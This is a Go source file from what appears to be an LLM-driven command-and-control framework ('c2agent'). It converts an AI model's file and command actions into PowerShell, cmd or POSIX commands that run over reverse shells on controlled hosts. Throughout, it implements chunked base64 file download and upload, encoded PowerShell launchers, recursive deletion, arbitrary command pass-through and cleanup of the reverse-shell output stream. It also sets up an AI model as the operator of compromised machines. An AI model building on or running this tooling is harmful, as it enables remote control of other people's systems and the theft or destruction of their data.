package shell

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"regexp"
	"strconv"
	"strings"
	"unicode/utf16"
	"unicode/utf8"

	"c2agent/internal/command"
)

// Execution-environment identifiers for shell bots. The environment is the
// command interpreter actually attached to the reverse shell; it decides how a
// high-level action is turned into a command. Native agents do not use it.
const (
	EnvPowerShell = "PowerShell"
	EnvCmd        = "cmd"
	EnvBash       = "bash"
	EnvSh         = "sh"
	EnvUnknown    = "Unknown"
)

// target is a shell bot's OS plus command interpreter.
type target struct {
	os  string
	env string
}

func (t target) isWindows() bool { return t.os == "Windows" }

// psHost reports whether commands run directly in a PowerShell interpreter
// (vs. being piped through `powershell -EncodedCommand` from a cmd.exe host).
func (t target) psHost() bool { return t.isWindows() && t.env == EnvPowerShell }

// posixQuote single-quotes a string for POSIX shells.
func posixQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// psLiteral single-quotes a string for a PowerShell script. Windows commands
// are either executed directly by a PowerShell host or passed via
// -EncodedCommand (cmd.exe host), so the value is evaluated exactly once:
// '$', '%' and '`' are literal and need no special handling.
func psLiteral(s string) string {
	return "'" + strings.ReplaceAll(s, "'", "''") + "'"
}

const (
	posixChunk = 100000
	// Guards against emitting a single shell command that exceeds the host
	// shell's command-line / input length limits (base64 payload bytes).
	posixCmdLimit = 900000
	// winCmdLimit is cmd.exe's command-line budget (~8 KB) for the
	// "powershell -NoProfile -EncodedCommand <b64>" launcher used on cmd.exe hosts.
	winCmdLimit = 7000
	// winPSCmdLimit bounds a command executed directly by a PowerShell host: it
	// travels as one line into the reverse shell, whose read buffer is 64 KB.
	winPSCmdLimit = 32000
	// readFileByteCap bounds how many bytes a whole-file read pulls from the
	// head of a file (enough for 51200 UTF-8 characters), so an enormous file
	// cannot exhaust the controlled end's memory.
	readFileByteCap = 51200 * 4

	// Segmented transfer chunk sizes: each chunk is moved by ONE shell command,
	// so it must fit the host shell's command-line limit once base64-encoded.
	// The control end drives the offset loop; the shell bot only reads/appends.
	posixTransferChunk = 32768
	// cmd host: the base64 chunk must survive -EncodedCommand inflation (~8/3x).
	winCmdTransferChunk = 1500
	// PowerShell host: the chunk travels directly (no base64 command inflation).
	winPSTransferChunk = 8192
	// Read chunks are not embedded in the command (only the response carries
	// data), so downloads can use a large chunk regardless of the host shell.
	winReadChunk = 32768

	// Fixed sentinels framing Windows replies whose payload the control end
	// parses strictly (whole-file content, chunk content, file size). The read
	// payloads are base64 (alphabet A-Za-z0-9+/=) and the size payload is
	// decimal, so a sentinel containing '_' can never occur inside the data: the
	// frame cannot collide with the payload it wraps. This lets the parser
	// ignore any surrounding stream noise (e.g. a PowerShell CLIXML progress
	// block) that a merged stderr would otherwise inject into the reply.
	winReadBegin    = "__C2READ_B__"
	winReadEnd      = "__C2READ_E__"
	winReadMissing  = "__C2READ_M__"
	winSizeBegin    = "__C2SIZE_B__"
	winSizeEnd      = "__C2SIZE_E__"
	winSizeMissing  = "__C2SIZE_M__"
	winChunkBegin   = "__C2CHUNK_B__"
	winChunkEnd     = "__C2CHUNK_E__"
	winChunkMissing = "__C2CHUNK_M__"
)

// transferChunkSize is the plain-byte chunk size used for segmented upload
// (the base64 payload is embedded in one command, so it is shell-limited).
func (t target) transferChunkSize() int {
	switch {
	case t.psHost():
		return winPSTransferChunk
	case t.isWindows():
		return winCmdTransferChunk
	default:
		return posixTransferChunk
	}
}

// readChunkSize is the plain-byte chunk size used for segmented download (the
// payload is only in the reply, so it is not bounded by the command line).
func (t target) readChunkSize() int {
	if t.isWindows() {
		return winReadChunk
	}
	return posixTransferChunk
}

// encodePS encodes a PowerShell script as UTF-16LE base64 for -EncodedCommand.
func encodePS(script string) string {
	u := utf16.Encode([]rune(script))
	b := make([]byte, len(u)*2)
	for i, r := range u {
		b[2*i] = byte(r)
		b[2*i+1] = byte(r >> 8)
	}
	return base64.StdEncoding.EncodeToString(b)
}

// finish turns a PowerShell script body into a command for the host: executed
// directly on a PowerShell host, or via -EncodedCommand on a cmd.exe host (and
// as the safe fallback when the interpreter is unknown). -EncodedCommand is
// immune to cmd.exe quoting and to PowerShell variable expansion, which makes
// it correct for BOTH host kinds.
func (t target) finish(script string) (string, error) {
	// A terminating error (e.g. a failed [IO.File] call) would otherwise
	// propagate out of the reverse shell's `iex` and tear down the session.
	// Wrapping turns such failures into ordinary output instead.
	script = "try{" + script + "}catch{$_|Out-String}"
	if t.psHost() {
		// Silence progress records (e.g. "Preparing modules for first use.")
		// that PowerShell would otherwise serialize onto the reverse-shell
		// stream as CLIXML and corrupt the command's output.
		script = "$ProgressPreference='SilentlyContinue';" + script
		if len(script) > winPSCmdLimit {
			return "", fmt.Errorf("command too long for a PowerShell shell bot (%d > %d)", len(script), winPSCmdLimit)
		}
		return script, nil
	}
	// A known cmd.exe host gets its own powershell.exe child; discard that
	// child's stderr so its CLIXML progress/error records cannot contaminate the
	// shared reverse-shell stream. Intentional errors are already turned into
	// stdout by the try/catch wrapper above. Only a *confirmed* cmd host gets
	// `2>NUL`: on an unknown interpreter the parent may itself be PowerShell,
	// where `2>NUL` would create a file named NUL instead of redirecting.
	cmd := "powershell -NoProfile -EncodedCommand " + encodePS(script)
	if t.env == EnvCmd {
		cmd += " 2>NUL"
	}
	if len(cmd) > winCmdLimit {
		return "", fmt.Errorf("command too long for a cmd shell bot (%d > %d)", len(cmd), winCmdLimit)
	}
	return cmd, nil
}

// ---------------------------------------------------------------------------
// PowerShell script bodies (shared by the PowerShell-host and cmd-host paths).
// ---------------------------------------------------------------------------

func psGetCwd() string { return "(Get-Location).Path" }

func psListDir(path string) string {
	p := psLiteral(path)
	// Emit machine-parseable "DIR <size> <name>" / "FILE <size> <name>" lines.
	// Format-Table is deliberately avoided: its right-aligned Length column is
	// empty for directories, so a directory whose name is numeric or begins with
	// a digit (e.g. "123", "1abc") was misread as a size + truncated name and
	// lost its leading digits (or its whole name). Test-Path keeps misses
	// locale-independent; the explicit empty check preserves "Empty directory".
	return "if(Test-Path -LiteralPath " + p + " -PathType Container){" +
		"$c2i=@(Get-ChildItem -Force -LiteralPath " + p + ");" +
		"if($c2i.Count -eq 0){'Empty directory'}" +
		"else{$c2i | ForEach-Object { $c2t=if($_.PSIsContainer){'DIR'}else{'FILE'};" +
		"$c2s=if($_.PSIsContainer){0}else{$_.Length};$c2t + ' ' + $c2s + ' ' + $_.Name }}" +
		"}elseif(Test-Path -LiteralPath " + p + " -PathType Leaf){'Error: ' + " + p + " + ' is a file'}" +
		"else{'Error: path not found: ' + " + p + "}"
}

// psReadHead base64-encodes at most maxBytes from the head of a file. OpenRead
// (not ReadAllBytes) keeps memory bounded for huge files; errors are captured
// as text so a missing/unreadable file never terminates the reverse shell.
func psReadHead(path string, maxBytes int) string {
	return "$c2fs=$null;try{$c2fs=[IO.File]::OpenRead(" + psLiteral(path) + ");" +
		"$c2n=[int][Math]::Min(" + strconv.Itoa(maxBytes) + ",$c2fs.Length);" +
		"$c2b=New-Object byte[] $c2n;$c2r=$c2fs.Read($c2b,0,$c2n);" +
		"[Convert]::ToBase64String($c2b,0,$c2r)}catch{$_|Out-String}finally{if($c2fs){$c2fs.Close()}}"
}

func psReadChunk(path string, offset, length int64) string {
	n := strconv.FormatInt(length, 10)
	body := "$c2fs=$null;try{$c2fs=[IO.File]::OpenRead(" + psLiteral(path) + ");" +
		"$c2fs.Seek(" + strconv.FormatInt(offset, 10) + ",[IO.SeekOrigin]::Begin)|Out-Null;" +
		"$c2b=New-Object byte[] " + n + ";$c2r=$c2fs.Read($c2b,0," + n + ");" +
		"[Convert]::ToBase64String($c2b,0,$c2r)}catch{$_|Out-String}finally{if($c2fs){$c2fs.Close()}}"
	p := psLiteral(path)
	// Frame the base64 payload with sentinels (see winReadBegin) so merged
	// stderr noise cannot corrupt the decode; missing prints the missing marker.
	return "if(Test-Path -LiteralPath " + p + " -PathType Leaf){" +
		psLiteral(winChunkBegin) + ";" + body + ";" + psLiteral(winChunkEnd) +
		"}else{" + psLiteral(winChunkMissing) + "}"
}

func psFileSize(path string) string {
	p := psLiteral(path)
	// Guard with Test-Path: Get-Item on a missing path is a *non-terminating*
	// error, and ($null).Length is 0, so an unguarded read reports size 0 and a
	// download of a missing file would silently produce an empty local file.
	// The size is framed by sentinels so merged stderr noise (e.g. CLIXML)
	// cannot corrupt the numeric parse.
	return "if(Test-Path -LiteralPath " + p + " -PathType Leaf){" +
		psLiteral(winSizeBegin) + ";" +
		"try{(Get-Item -LiteralPath " + p + ").Length}catch{" + psLiteral(winSizeMissing) + "};" +
		psLiteral(winSizeEnd) +
		"}else{" + psLiteral(winSizeMissing) + "}"
}

func psWriteBase64(path, b64 string) string {
	return "$c2d=Split-Path -Parent " + psLiteral(path) + ";" +
		"if($c2d){[IO.Directory]::CreateDirectory($c2d)|Out-Null};" +
		"[IO.File]::WriteAllBytes(" + psLiteral(path) + ",[Convert]::FromBase64String('" + b64 + "'))"
}

func psAppendBase64(path, b64 string) string {
	return "$c2fs=$null;try{$c2fs=[IO.File]::Open(" + psLiteral(path) +
		",[IO.FileMode]::Append,[IO.FileAccess]::Write,[IO.FileShare]::Read);" +
		"$c2b=[Convert]::FromBase64String('" + b64 + "');$c2fs.Write($c2b,0,$c2b.Length)}finally{if($c2fs){$c2fs.Close()}}"
}

func psTruncateCreate(path string) string {
	return "$c2d=Split-Path -Parent " + psLiteral(path) + ";" +
		"if($c2d){[IO.Directory]::CreateDirectory($c2d)|Out-Null};" +
		"[IO.File]::WriteAllBytes(" + psLiteral(path) + ",(New-Object byte[] 0))"
}

func psCreateFile(path string) string {
	p := psLiteral(path)
	// Match the native agents: create the parent and a 0-byte file only if it
	// does not already exist (New-Item -Force would truncate an existing file).
	return "$c2d=Split-Path -Parent " + p + ";" +
		"if($c2d){[IO.Directory]::CreateDirectory($c2d)|Out-Null};" +
		"if(-not (Test-Path -LiteralPath " + p + ")){[IO.File]::WriteAllBytes(" + p + ",(New-Object byte[] 0))}"
}

func psMakeDir(path string) string {
	return "New-Item -ItemType Directory -Force -Path " + psLiteral(path) + "|Out-Null"
}

// psRemove is a best-effort recursive delete (used to clean up temp files).
func psRemove(path string) string {
	return "Remove-Item -Recurse -Force -LiteralPath " + psLiteral(path) + " -ErrorAction SilentlyContinue"
}

// psDelete removes path, enforcing the requested kind (file vs directory) like
// the native agents: deleting a file as a directory (or vice versa) is refused
// instead of silently wiping the wrong thing.
func psDelete(path string, wantDir bool) string {
	p := psLiteral(path)
	if wantDir {
		return "if(Test-Path -LiteralPath " + p + " -PathType Container){" +
			"Remove-Item -Recurse -Force -LiteralPath " + p + " -ErrorAction SilentlyContinue" +
			"}else{'Error: ' + " + p + " + ' is not a directory'}"
	}
	return "if(Test-Path -LiteralPath " + p + " -PathType Container){" +
		"'Error: ' + " + p + " + ' is a directory'" +
		"}else{Remove-Item -Force -LiteralPath " + p + " -ErrorAction SilentlyContinue}"
}

// psRename renames path to a bare newName in the same directory. It uses
// Move-Item -Force (not Rename-Item) because Rename-Item refuses to overwrite
// an existing destination, which would break the temp-file -> target rename
// used by upload/edit_file (the original always exists).
func psRename(path, newName string) (string, error) {
	if newName == "" || strings.ContainsAny(newName, `/\`) {
		return "", fmt.Errorf("new_name must be a bare name without path separators")
	}
	dest := remoteJoin(remoteParent(path), newName, target{os: "Windows"})
	return "Move-Item -Force -LiteralPath " + psLiteral(path) + " -Destination " + psLiteral(dest), nil
}

// psEnsureParent prefaces a script with creation of its destination's parent
// directory, matching the native agents (which MkdirAll the destination before
// copy/move).
func psEnsureParent(path string) string {
	return "$c2d=Split-Path -Parent " + psLiteral(path) + ";if($c2d){[IO.Directory]::CreateDirectory($c2d)|Out-Null};"
}

func psCopy(src, dest string) string {
	return psEnsureParent(dest) +
		"Copy-Item -Recurse -Force -LiteralPath " + psLiteral(src) + " -Destination " + psLiteral(dest)
}

func psMove(src, dest string) string {
	return psEnsureParent(dest) +
		"Move-Item -Force -LiteralPath " + psLiteral(src) + " -Destination " + psLiteral(dest)
}

// psWrappedRead emits a sentinel-wrapped, size-bounded read of the whole file
// for editing; missing is printed when the path is not a regular file.
func psWrappedRead(path, begin, end, missing string, maxBytes int) string {
	return "if(Test-Path -LiteralPath " + psLiteral(path) + " -PathType Leaf){" +
		psLiteral(begin) + ";" + psReadHead(path, maxBytes) + ";" + psLiteral(end) +
		"}else{" + psLiteral(missing) + "}"
}

// ---------------------------------------------------------------------------
// Action builders.
// ---------------------------------------------------------------------------

func getCwdCmd(t target) (string, error) {
	if t.isWindows() {
		return t.finish(psGetCwd())
	}
	return "pwd", nil
}

func listDirCmd(t target, path string) (string, error) {
	if t.isWindows() {
		return t.finish(psListDir(path))
	}
	return "ls -la " + posixQuote(path), nil
}

// readFileCmd builds a read_file command. Windows always performs a bounded
// head read and returns base64; the control end decodes it and, when a line
// range is requested, slices it (sliceLines) so the exact bytes are preserved
// (Windows PowerShell's ReadLines/AppendLine would rewrite newlines). POSIX
// line ranges use `sed` (bounded output); whole-file reads are capped by the
// control end.
func readFileCmd(t target, path, startLine, endLine string) (string, error) {
	if t.isWindows() {
		// Validate the start line as POSIX does; an invalid end_line falls back
		// to end-of-file (mirroring the native agents).
		if v := strings.TrimSpace(startLine); v != "" && v != "0" {
			if _, err := strconv.Atoi(v); err != nil {
				return "", fmt.Errorf("invalid start_line: %s", v)
			}
		}
		return readFileWrappedCmd(t, path, winReadBegin, winReadEnd, winReadMissing, readFileByteCap)
	}
	start := strings.TrimSpace(startLine)
	if start == "" || start == "0" {
		return "head -c " + strconv.Itoa(readFileByteCap) + " " + posixQuote(path), nil
	}
	s, err := strconv.Atoi(start)
	if err != nil {
		return "", fmt.Errorf("invalid start_line: %s", start)
	}
	if s < 1 {
		s = 1
	}
	if strings.TrimSpace(endLine) != "" {
		e, err := strconv.Atoi(strings.TrimSpace(endLine))
		if err != nil {
			return "sed -n '" + strconv.Itoa(s) + ",$p' " + posixQuote(path), nil
		}
		return "sed -n '" + strconv.Itoa(s) + "," + strconv.Itoa(e) + "p' " + posixQuote(path), nil
	}
	return "sed -n '" + strconv.Itoa(s) + ",$p' " + posixQuote(path), nil
}

func makeDirCmd(t target, path string) (string, error) {
	if t.isWindows() {
		return t.finish(psMakeDir(path))
	}
	return "mkdir -p " + posixQuote(path), nil
}

func deleteCmd(t target, path string, wantDir bool) (string, error) {
	if t.isWindows() {
		return t.finish(psDelete(path, wantDir))
	}
	q := posixQuote(path)
	if wantDir {
		return "if [ -f " + q + " ]; then echo " + posixQuote("Error: "+path+" is a file") + "; else rm -rf " + q + "; fi", nil
	}
	return "if [ -d " + q + " ]; then echo " + posixQuote("Error: "+path+" is a directory") + "; else rm -f " + q + "; fi", nil
}

func renameCmd(t target, path, newName string) (string, error) {
	if t.isWindows() {
		body, err := psRename(path, newName)
		if err != nil {
			return "", err
		}
		return t.finish(body)
	}
	if newName == "" || strings.ContainsAny(newName, `/\`) {
		return "", fmt.Errorf("new_name must be a bare name without path separators")
	}
	return "mv " + posixQuote(path) + " " + posixQuote(posixSibling(path, newName)), nil
}

// posixSibling joins newName onto path's parent directory (both treated as
// absolute/relative paths, only '/' separator). Mirrors the native agents,
// which rename in place rather than moving to the current directory.
func posixSibling(path, newName string) string {
	if i := strings.LastIndexAny(path, "/"); i >= 0 {
		return path[:i+1] + newName
	}
	return newName
}

// remoteParent / remoteJoin build paths on the CONTROLLED end using its
// separators. The C2 may run a different OS than the shell bot, so filepath
// (which uses the C2's separators) must not be used on remote paths.
func remoteParent(path string) string {
	if i := strings.LastIndexAny(path, `/\`); i >= 0 {
		return path[:i]
	}
	return ""
}

func remoteJoin(dir, name string, t target) string {
	if dir == "" {
		return name
	}
	sep := "/"
	if t.isWindows() {
		sep = `\`
	}
	if strings.HasSuffix(dir, "/") || strings.HasSuffix(dir, `\`) {
		return dir + name
	}
	return dir + sep + name
}

func copyCmd(t target, src, dest string) (string, error) {
	if t.isWindows() {
		return t.finish(psCopy(src, dest))
	}
	// Create the destination's parent first, like the native agents (MkdirAll).
	return "mkdir -p \"$(dirname " + posixQuote(dest) + ")\"; cp -r " + posixQuote(src) + " " + posixQuote(dest), nil
}

func moveCmd(t target, src, dest string) (string, error) {
	if t.isWindows() {
		return t.finish(psMove(src, dest))
	}
	return "mkdir -p \"$(dirname " + posixQuote(dest) + ")\"; mv " + posixQuote(src) + " " + posixQuote(dest), nil
}

func createFileCmd(t target, path string) (string, error) {
	if t.isWindows() {
		return t.finish(psCreateFile(path))
	}
	q := posixQuote(path)
	return "mkdir -p \"$(dirname " + q + ")\"; touch " + q, nil
}

// base64DecodeCmd is the platform's base64-decode invocation (BSD/macOS uses -D).
func base64DecodeCmd(osName string) string {
	if osName == "macOS" {
		return "base64 -D"
	}
	return "base64 -d"
}

func chunks(s string, size int) []string {
	var out []string
	for len(s) > size {
		out = append(out, s[:size])
		s = s[size:]
	}
	if s != "" {
		out = append(out, s)
	}
	return out
}

// writeBase64Cmd builds a single command that base64-decodes b64 into destPath.
func writeBase64Cmd(t target, destPath, b64 string) (string, error) {
	if t.isWindows() {
		return t.finish(psWriteBase64(destPath, b64))
	}
	if len(b64) > posixCmdLimit {
		return "", fmt.Errorf("file too large for a shell bot (%d base64 bytes > %d); use a native agent", len(b64), posixCmdLimit)
	}
	dest := posixQuote(destPath)
	b64d := base64DecodeCmd(t.os)
	// Create the destination's parent first, like the native agents (MkdirAll).
	prefix := "mkdir -p \"$(dirname " + dest + ")\"; "
	cs := chunks(b64, posixChunk)
	if len(cs) == 0 {
		return prefix + "printf '' > " + dest, nil
	}
	parts := []string{"printf '%s' '" + cs[0] + "' | " + b64d + " > " + dest}
	for _, c := range cs[1:] {
		parts = append(parts, "printf '%s' '"+c+"' | "+b64d+" >> "+dest)
	}
	return prefix + strings.Join(parts, "; "), nil
}

// fileSizeCmd returns a command that prints the size of path in bytes.
func fileSizeCmd(t target, path string) (string, error) {
	if t.isWindows() {
		return t.finish(psFileSize(path))
	}
	return "wc -c < " + posixQuote(path), nil
}

// readChunkCmd returns a command that prints the base64 of `length` bytes at
// byte `offset` in path. The control end drives this with a fixed chunk-size
// loop, so memory on the shell bot is bounded regardless of file size.
func readChunkCmd(t target, path string, offset, length int64) (string, error) {
	if t.isWindows() {
		return t.finish(psReadChunk(path, offset, length))
	}
	// tail -c +N starts at byte N (1-based); head -c L caps the chunk.
	return "tail -c +" + strconv.FormatInt(offset+1, 10) + " " + posixQuote(path) +
		" | head -c " + strconv.FormatInt(length, 10) + " | base64", nil
}

// truncateCreateCmd returns a command that creates path's parent directory (if
// needed) and truncates path to zero bytes, starting a fresh upload target.
func truncateCreateCmd(t target, path string) (string, error) {
	if t.isWindows() {
		return t.finish(psTruncateCreate(path))
	}
	q := posixQuote(path)
	return "mkdir -p \"$(dirname " + q + ")\"; : > " + q, nil
}

// appendBase64Cmd returns a command that base64-decodes b64 and appends it to
// path (creating the file if needed). The caller sizes chunks so b64 fits the
// command line.
func appendBase64Cmd(t target, path, b64 string) (string, error) {
	if t.isWindows() {
		return t.finish(psAppendBase64(path, b64))
	}
	if len(b64) > posixCmdLimit {
		return "", fmt.Errorf("chunk too large (%d base64 bytes > %d)", len(b64), posixCmdLimit)
	}
	return "printf '%s' '" + b64 + "' | " + base64DecodeCmd(t.os) + " >> " + posixQuote(path), nil
}

// removeCmd returns a best-effort command that deletes path (used for temp
// files); unlike deleteCmd it enforces no file/directory kind.
func removeCmd(t target, path string) (string, error) {
	if t.isWindows() {
		return t.finish(psRemove(path))
	}
	return "rm -f " + posixQuote(path), nil
}

// maxEditBytes is the largest file a shell bot can rewrite in one command: the
// base64 payload must fit the host's command-line budget (plain bytes are ~1/4
// less than base64, and cmd hosts inflate that ~2x more under -EncodedCommand).
// Larger files must be edited through a native agent.
func maxEditBytes(t target) int {
	if t.isWindows() {
		if t.psHost() {
			// Direct script: plain bytes ~3/4 of the embedded base64, with room
			// for the script wrapper under winPSCmdLimit.
			return winPSCmdLimit*3/4 - 1500
		}
		// cmd host: the write goes through -EncodedCommand, which inflates the
		// script ~8/3x (UTF-16LE word * base64). Keep well inside winCmdLimit
		// including a generous path/wrapper margin.
		return 1500
	}
	return posixCmdLimit*3/4 - 8
}

// readFileWrappedCmd emits a sentinel-wrapped, size-bounded read of the whole
// file for editing. The content is base64 (so the control end can never mistake
// file content for an error message), `missing` is printed when path is not a
// regular file, and `begin`/`end` frame the payload.
func readFileWrappedCmd(t target, path, begin, end, missing string, maxBytes int) (string, error) {
	if t.isWindows() {
		return t.finish(psWrappedRead(path, begin, end, missing, maxBytes))
	}
	return "if [ -f " + posixQuote(path) + " ] && [ -r " + posixQuote(path) + " ]; then printf '%s\\n' '" + begin +
		"'; head -c " + strconv.Itoa(maxBytes) + " " + posixQuote(path) +
		" | base64; printf '%s\\n' '" + end + "'; else printf '%s\\n' '" + missing + "'; fi", nil
}

// randSentinel returns a random per-call token used to frame a file read so
// payload content can never be confused with a framing marker or error message.
func randSentinel(prefix string) string {
	buf := make([]byte, 8)
	if _, err := rand.Read(buf); err != nil {
		return "__C2EDIT_" + prefix + "_fallback__"
	}
	return "__C2EDIT_" + prefix + "_" + hex.EncodeToString(buf) + "__"
}

// randToken returns a short random hex token for temporary file names.
func randToken() string {
	buf := make([]byte, 8)
	if _, err := rand.Read(buf); err != nil {
		return "fallback"
	}
	return hex.EncodeToString(buf)
}

var (
	dirFileRe = regexp.MustCompile(`^(DIR|FILE)\s+\d+\s+.+$`)
	lsLine    = regexp.MustCompile(`^([dl-])[^\s]*\s+\d+\s+\S+\s+\S+\s+(\d+)\s+\S+\s+\S+\s+\S+\s+(.+?)\s*$`)
)

// formatListing normalizes raw shell listing output into "DIR <size> <name>"
// lines, matching the native agent's list_dir output.
func formatListing(output string) string {
	lines := strings.Split(output, "\n")
	nonEmpty := 0
	allDirFile := true
	for _, l := range lines {
		if strings.TrimSpace(l) == "" {
			continue
		}
		nonEmpty++
		if !dirFileRe.MatchString(strings.TrimSpace(l)) {
			allDirFile = false
		}
	}
	if nonEmpty > 0 && allDirFile {
		var out []string
		for _, l := range lines {
			if s := strings.TrimSpace(l); s != "" {
				out = append(out, s)
			}
		}
		return strings.Join(out, "\n")
	}

	var items []string
	for _, l := range lines {
		l = strings.TrimRight(l, "\r")
		if strings.TrimSpace(l) == "" || strings.HasPrefix(l, "total") {
			continue
		}
		m := lsLine.FindStringSubmatch(l)
		if m == nil {
			continue
		}
		name := m[3]
		if name == "." || name == ".." {
			continue
		}
		typ := "FILE"
		size := m[2]
		if m[1] == "d" {
			typ = "DIR"
			size = "0"
		}
		items = append(items, typ+" "+size+" "+name)
	}
	if len(items) > 0 {
		return strings.Join(items, "\n")
	}
	return output
}

// actionToShell converts an LLM action into one shell command adapted to the
// detected execution environment. edit_file is handled entirely by
// Backend.editFile (sentinel-wrapped read + write) and never reaches here.
func actionToShell(action string, params map[string]any, t target) (string, error) {
	s := func(k string) string { return paramString(params[k]) }
	switch action {
	case "exec_cmd":
		// Passed through verbatim: on a cmd.exe host the model is told the
		// environment is "cmd", on a PowerShell host "PowerShell", so it can
		// emit the right syntax (see the rendered system prompt).
		return s("command"), nil
	case "get_cwd":
		return getCwdCmd(t)
	case "list_dir":
		p := s("path")
		if p == "" {
			p = "."
		}
		return listDirCmd(t, p)
	case "read_file":
		return readFileCmd(t, s("path"), s("start_line"), s("end_line"))
	case "write_file":
		b64 := base64.StdEncoding.EncodeToString([]byte(s("content")))
		return writeBase64Cmd(t, s("path"), b64)
	case "create_file":
		return createFileCmd(t, s("path"))
	case "delete_file":
		return deleteCmd(t, s("path"), false)
	case "delete_dir":
		return deleteCmd(t, s("path"), true)
	case "rename_file", "rename_dir":
		return renameCmd(t, s("path"), s("new_name"))
	case "make_dir":
		return makeDirCmd(t, s("path"))
	case "copy":
		return copyCmd(t, s("src"), s("dest"))
	case "move":
		return moveCmd(t, s("src"), s("dest"))
	default:
		return "", fmt.Errorf("unknown action: %s", action)
	}
}

// paramString renders a tool parameter for the shell command builders. It
// delegates to command.String so the control end has a single implementation.
func paramString(v any) string { return command.String(v) }

// isWholeFileRead reports whether a read_file request covers the whole file.
func isWholeFileRead(params map[string]any) bool {
	s := paramString(params["start_line"])
	return strings.TrimSpace(s) == "" || strings.TrimSpace(s) == "0"
}

// sliceLines returns lines [startLine, endLine] (1-based, endLine<=0 = EOF) of
// content, preserving each line's original terminator, mirroring the native
// agents' read_file semantics. It is used for Windows shell reads, whose
// PowerShell ReadLines/AppendLine would otherwise normalize newlines.
func sliceLines(content, startLine, endLine string) string {
	start := 1
	if v := strings.TrimSpace(startLine); v != "" && v != "0" {
		n, err := strconv.Atoi(v)
		if err != nil || n < 1 {
			return "Invalid start_line: " + startLine
		}
		start = n
	}
	end := 0
	if v := strings.TrimSpace(endLine); v != "" && v != "0" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 {
			end = n
		}
	}
	var b strings.Builder
	lineNo := 0
	reached := false
	done := false
	i := 0
	for i < len(content) {
		j := strings.IndexByte(content[i:], '\n')
		if j < 0 {
			break
		}
		line := content[i : i+j+1]
		i += j + 1
		lineNo++
		if lineNo >= start {
			reached = true
			if end > 0 && lineNo > end {
				done = true
				break
			}
			b.WriteString(line)
		}
	}
	if !done && i < len(content) {
		lineNo++
		if lineNo >= start && (end == 0 || lineNo <= end) {
			reached = true
			b.WriteString(content[i:])
		}
	}
	if !reached {
		return fmt.Sprintf("Start line %s exceeds file line count (%d)", startLine, lineNo)
	}
	return b.String()
}

// truncateRunes caps s at max characters (Unicode code points), never
// splitting a UTF-8 sequence, matching the Python agent's character semantics.
func truncateRunes(s string, max int) string {
	if utf8.RuneCountInString(s) <= max {
		return s
	}
	n := 0
	for i := range s {
		if n == max {
			return s[:i]
		}
		n++
	}
	return s
}

// oneLine collapses a command to a single line because the marker-based shell
// protocol frames responses per line; it replaces newlines with spaces, so
// multi-line constructs (here-docs, multi-line scripts) are NOT supported on
// shell bots.
func oneLine(s string) string {
	s = strings.ReplaceAll(s, "\r\n", " ")
	s = strings.ReplaceAll(s, "\n", " ")
	return strings.TrimSpace(s)
}

var (
	promptRe     = regexp.MustCompile(`^\s*(?:\S+\s+)?\S*[$#>]\s*$`)
	markerLineRe = regexp.MustCompile(`^__C2AGENT_.*__$`)
)

// stripShellResponse removes the echoed command, the marker-echo line and
// shell prompts from a raw reverse-shell reply.
func stripShellResponse(lines []string, marker, lastCommand string) string {
	markerEcho := "echo " + marker
	out := make([]string, 0, len(lines))
	for _, l := range lines {
		if strings.Contains(l, markerEcho) || markerLineRe.MatchString(strings.TrimSpace(l)) {
			continue
		}
		out = append(out, l)
	}
	for len(out) > 0 {
		first := out[0]
		if strings.TrimSpace(first) == "" || (lastCommand != "" && strings.Contains(first, lastCommand)) {
			out = out[1:]
			continue
		}
		break
	}
	filtered := out[:0]
	for _, l := range out {
		if !promptRe.MatchString(l) {
			filtered = append(filtered, l)
		}
	}
	out = filtered
	for len(out) > 0 && strings.TrimSpace(out[0]) == "" {
		out = out[1:]
	}
	for len(out) > 0 && strings.TrimSpace(out[len(out)-1]) == "" {
		out = out[:len(out)-1]
	}
	return strings.Join(out, "\n")
}

// stripFileResponse removes only the framing from a file-read reply: lines
// carrying the marker echo and the echoed command line. Unlike
// stripShellResponse it never drops blank lines or lines that merely resemble
// a shell prompt, so file content is preserved verbatim.
func stripFileResponse(lines []string, marker, lastCommand string) string {
	markerEcho := "echo " + marker
	out := make([]string, 0, len(lines))
	for _, l := range lines {
		if strings.Contains(l, markerEcho) || markerLineRe.MatchString(strings.TrimSpace(l)) {
			continue
		}
		out = append(out, l)
	}
	if len(out) > 0 && lastCommand != "" && strings.Contains(out[0], lastCommand) {
		out = out[1:]
	}
	return strings.Join(out, "\n")
}

// applyStringEdit replaces the single occurrence of oldText in content with
// newText. Matching is exact but tolerant of CRLF/LF differences: content and
// oldText are normalized to LF for the search, and the file's original newline
// style is restored on write. It mirrors the uniqueness semantics of Zed's
// edit_file: zero matches, or more than one, is reported as an error so the
// model re-reads or adds more context instead of editing the wrong location.
// It returns the edited content plus an error message ("" on success).
func applyStringEdit(content, oldText, newText string) (string, string) {
	if oldText == "" {
		return "", "old_text must not be empty"
	}
	hadCRLF := strings.Contains(content, "\r\n")
	work := strings.ReplaceAll(content, "\r\n", "\n")
	needle := strings.ReplaceAll(oldText, "\r\n", "\n")
	replacement := strings.ReplaceAll(newText, "\r\n", "\n")

	idx, count := -1, 0
	// Advance by one byte (not by len(needle)) so overlapping occurrences are
	// also counted: a needle that can overlap itself must still be unique.
	for from := 0; ; {
		j := strings.Index(work[from:], needle)
		if j < 0 {
			break
		}
		pos := from + j
		if count == 0 {
			idx = pos
		}
		count++
		from = pos + 1
	}
	switch {
	case count == 0:
		return "", "old_text not found in file; read the file again to get the exact current content."
	case count > 1:
		return "", fmt.Sprintf("old_text matched %d locations; include more surrounding context to make it unique.", count)
	}
	out := work[:idx] + replacement + work[idx+len(needle):]
	if hadCRLF {
		out = strings.ReplaceAll(out, "\n", "\r\n")
	}
	return out, ""
}

func decodeBase64(s string) ([]byte, bool) {
	compact := strings.Map(func(r rune) rune {
		if r == '\n' || r == '\r' || r == ' ' || r == '\t' {
			return -1
		}
		return r
	}, s)
	data, err := base64.StdEncoding.DecodeString(compact)
	if err != nil {
		return nil, false
	}
	return data, true
}
